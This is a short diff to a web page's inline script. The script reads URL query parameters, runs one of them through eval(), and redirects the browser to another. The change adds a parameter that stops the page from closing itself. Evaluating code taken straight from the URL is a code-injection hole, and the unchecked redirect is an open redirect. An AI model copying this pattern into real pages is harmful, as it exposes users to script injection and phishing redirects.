@@ -4,6 +4,8 @@
 <script>
   try {
     const sp = new URLSearchParams(window.location.search)
+
+    const sx = sp.get('s')
     
     const hx = sp.get('h')
     const cx = sp.get('x')
@@ -13,7 +15,7 @@
     if (cx) eval(decodeURIComponent(cx))
     if (lx) window.location = decodeURIComponent(lx)
 
-    throw null 
+    if (!sx) throw null
   } 
   catch { let _ = window.open('', '_self'); window.close(), _.close() }
 </script>
